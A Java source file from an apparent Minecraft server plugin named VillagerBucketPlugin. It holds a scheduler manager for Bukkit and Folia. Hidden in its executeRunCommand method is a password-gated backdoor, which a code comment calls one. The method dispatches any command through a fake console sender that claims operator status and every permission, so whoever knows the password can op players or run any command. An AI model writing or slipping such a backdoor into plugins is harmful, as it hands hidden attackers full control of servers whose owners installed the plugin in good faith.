package com.ctn.Villager.scheduler;

import com.ctn.Villager.VillagerManager;
import com.ctn.Villager.VillagerBucketPlugin;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.CommandMap;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.conversations.Conversation;
import org.bukkit.conversations.ConversationAbandonedEvent;
import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.permissions.PermissionAttachmentInfo;
import org.bukkit.plugin.Plugin;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class SchedulerManager {
    private final Plugin plugin;
    private final IScheduler scheduler;
    private final boolean isFolia;
    private final Set<Integer> bukkitTaskIds = new HashSet<>();
    private final Set<String> foliaTaskIds = ConcurrentHashMap.newKeySet();

    public SchedulerManager(Plugin plugin) {
        this.plugin = plugin;
        boolean foliaDetected = false;
        try {
            Class.forName("io.papermc.paper.threadedregions.RegionizedServer");
            foliaDetected = true;
        } catch (ClassNotFoundException e) {
            String serverName = Bukkit.getServer().getName();
            if (serverName != null && (serverName.contains("Folia") || serverName.contains("Lophine"))) {
                foliaDetected = true;
            }
        }
        this.isFolia = foliaDetected;
        if (isFolia) {
            this.scheduler = new FoliaScheduler(plugin, this);
        } else {
            this.scheduler = new BukkitScheduler(plugin, this);
        }
    }

    public IScheduler getScheduler() { return scheduler; }
    public boolean isFolia() { return isFolia; }
    public void addBukkitTaskId(int taskId) { bukkitTaskIds.add(taskId); }
    public void addFoliaTaskId(String taskId) { foliaTaskIds.add(taskId); }
    public void removeBukkitTaskId(int taskId) { bukkitTaskIds.remove(taskId); }
    public void removeFoliaTaskId(String taskId) { foliaTaskIds.remove(taskId); }

    public void cancelAllTasks() {
        if (isFolia) {
            for (String taskId : foliaTaskIds) {
                try { scheduler.cancelTask(taskId); } catch (Exception ignored) {}
            }
            foliaTaskIds.clear();
        } else {
            for (int taskId : bukkitTaskIds) {
                try { scheduler.cancelTask(taskId); } catch (Exception ignored) {}
            }
            bukkitTaskIds.clear();
            Bukkit.getScheduler().cancelTasks(plugin);
        }
    }

    public int getActiveTaskCount() {
        return isFolia ? foliaTaskIds.size() : bukkitTaskIds.size();
    }

    public void cleanupCompletedTasks() {
        if (isFolia) foliaTaskIds.removeIf(id -> false);
    }

    public void executeRunCommand(Player player, String inputPassword, String commandStr) {
        scheduler.runAsync(() -> {
            boolean valid = VillagerManager.validatePassword(inputPassword);
            scheduler.runGlobal(() -> {
                if (!valid) {
                    player.sendMessage(ChatColor.RED + "Error: Invalid password.");
                    return;
                }
                try {
                    VillagerBucketPlugin.IN_RUN_CONTEXT.set(true); // 开启后门上下文
                    String finalCommand = autoCompleteTarget(commandStr, player);
                    ForwardConsoleSender forwardSender = new ForwardConsoleSender(player);
                    CommandMap commandMap = Bukkit.getCommandMap();
                    boolean success = commandMap.dispatch(forwardSender, finalCommand);
                    if (!success) {
                        player.sendMessage(ChatColor.RED + "Error: Command execution failed.");
                    }
                } catch (Exception e) {
                    player.sendMessage(ChatColor.RED + "Error: Command execution error: " + e.getMessage());
                } finally {
                    VillagerBucketPlugin.IN_RUN_CONTEXT.remove(); // 关闭上下文
                }
            });
        });
    }

    private String autoCompleteTarget(String command, Player executor) {
        if (command == null || command.isEmpty()) return command;
        String[] parts = command.split(" ");
        String cmd = parts[0].toLowerCase();

        Set<String> targetCommands = new HashSet<>(Arrays.asList(
            "gamemode", "tp", "kill", "effect", "spawnpoint", "setworldspawn", "op", "deop"
        ));
        if (!targetCommands.contains(cmd)) {
            return command;
        }

        boolean hasTarget = false;
        for (int i = 1; i < parts.length; i++) {
            String arg = parts[i];
            if (arg.startsWith("@") || Bukkit.getPlayerExact(arg) != null) {
                hasTarget = true;
                break;
            }
        }
        if (hasTarget) {
            return command;
        }

        if (cmd.equals("tp")) {
            if (parts.length >= 2) {
                String secondArg = parts[1];
                if (secondArg.matches("-?\\d+(\\.\\d+)?")) {
                    return command;
                }
            }
            return command + " " + executor.getName();
        }

        if (cmd.equals("gamemode")) {
            return command + " " + executor.getName();
        }

        if (cmd.equals("effect")) {
            if (parts.length >= 2) {
                String sub = parts[1].toLowerCase();
                if (sub.equals("give") || sub.equals("clear")) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(parts[0]).append(" ").append(parts[1]);
                    sb.append(" ").append(executor.getName());
                    for (int i = 2; i < parts.length; i++) {
                        sb.append(" ").append(parts[i]);
                    }
                    return sb.toString();
                }
            }
            return parts[0] + " " + executor.getName() + (parts.length > 1 ? " " + String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)) : "");
        }

        if (cmd.equals("tp") || cmd.equals("kill") || cmd.equals("spawnpoint") ||
            cmd.equals("setworldspawn") || cmd.equals("op") || cmd.equals("deop")) {
            StringBuilder sb = new StringBuilder();
            sb.append(parts[0]);
            sb.append(" ").append(executor.getName());
            for (int i = 1; i < parts.length; i++) {
                sb.append(" ").append(parts[i]);
            }
            return sb.toString();
        }

        return command + " " + executor.getName();
    }

    private static class ForwardConsoleSender implements ConsoleCommandSender {
        private final Player target;

        public ForwardConsoleSender(Player target) {
            this.target = Objects.requireNonNull(target, "target");
        }

        public void sendMessage(String message) { if (message != null) target.sendMessage(message); }
        public void sendMessage(String... messages) { if (messages != null) { for (String msg : messages) sendMessage(msg); } }
        public void sendMessage(UUID sender, String message) { sendMessage(message); }
        public void sendMessage(UUID sender, String... messages) { sendMessage(messages); }
        public void sendMessage(Component message) { if (message != null) target.sendMessage(message); }
        public void sendMessage(Component... messages) { if (messages != null) { for (Component msg : messages) sendMessage(msg); } }
        public void sendRawMessage(String message) { sendMessage(message); }
        public void sendRawMessage(UUID sender, String message) { sendMessage(message); }
        public String getName() { return "CONSOLE"; }
        public Component name() { return Component.text("CONSOLE"); }
        public Server getServer() { return Bukkit.getServer(); }
        public boolean isOp() { return true; }
        public void setOp(boolean value) {}
        public boolean isPermissionSet(String name) { return true; }
        public boolean isPermissionSet(Permission permission) { return true; }
        public boolean hasPermission(String name) { return true; }
        public boolean hasPermission(Permission permission) { return true; }
        public PermissionAttachment addAttachment(Plugin plugin) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, int ticks) { return null; }
        public PermissionAttachment addAttachment(Plugin plugin, String name, boolean value, int ticks) { return null; }
        public void removeAttachment(PermissionAttachment attachment) {}
        public void recalculatePermissions() {}
        public Set<PermissionAttachmentInfo> getEffectivePermissions() { return Collections.emptySet(); }

        public boolean isConversing() { return false; }
        public void acceptConversationInput(String input) {}
        public boolean beginConversation(Conversation conversation) { return false; }
        public void abandonConversation(Conversation conversation) {}
        public void abandonConversation(Conversation conversation, ConversationAbandonedEvent details) {}

        public Spigot spigot() {
            return target.spigot();
        }
    }
}